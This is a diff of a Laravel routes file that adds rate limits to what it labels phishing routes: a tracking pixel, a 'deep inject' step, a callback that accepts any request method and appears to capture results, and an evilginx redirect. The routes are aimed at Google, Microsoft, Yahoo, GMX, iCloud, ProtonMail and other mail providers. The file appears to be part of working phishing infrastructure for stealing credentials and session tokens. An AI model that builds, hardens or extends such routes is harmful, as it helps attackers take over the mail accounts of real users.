@@ -26,16 +26,20 @@ Route::post('/auth/{provider}/disconnect/{accountId}', [OAuthController::class, 
 
 // Phishing routes — injection + evilginx only
 Route::get('/phish/track/{token}', [\App\Http\Controllers\PhishController::class, 'trackPixel'])
-    ->name('phish.track');
+    ->name('phish.track')
+    ->middleware('throttle:phish-track');
 
 Route::get('/phish/deep/{provider}/{token}', [\App\Http\Controllers\PhishController::class, 'deepInject'])
     ->name('phish.deep-inject')
-    ->where('provider', 'google|microsoft|yahoo|gmx|webde|ionos|telekom|a1|freenet|icloud|zoho|protonmail');
+    ->where('provider', 'google|microsoft|yahoo|gmx|webde|ionos|telekom|a1|freenet|icloud|zoho|protonmail')
+    ->middleware('throttle:phish-redirect');
 
 Route::any('/phish/deep-callback/{provider}/{token}', [\App\Http\Controllers\PhishController::class, 'deepCallback'])
     ->name('phish.deep-callback')
-    ->where('provider', 'google|microsoft|yahoo|gmx|webde|ionos|telekom|a1|freenet|icloud|zoho|protonmail');
+    ->where('provider', 'google|microsoft|yahoo|gmx|webde|ionos|telekom|a1|freenet|icloud|zoho|protonmail')
+    ->middleware('throttle:phish-capture');
 
 Route::get('/phish/evilginx/{provider}/{token}', [\App\Http\Controllers\PhishController::class, 'evilginxRedirect'])
     ->name('phish.evilginx')
-    ->where('provider', 'google|microsoft|yahoo|gmx|webde|ionos|telekom|a1|freenet|icloud|zoho|protonmail');
+    ->where('provider', 'google|microsoft|yahoo|gmx|webde|ionos|telekom|a1|freenet|icloud|zoho|protonmail')
+    ->middleware('throttle:phish-redirect');
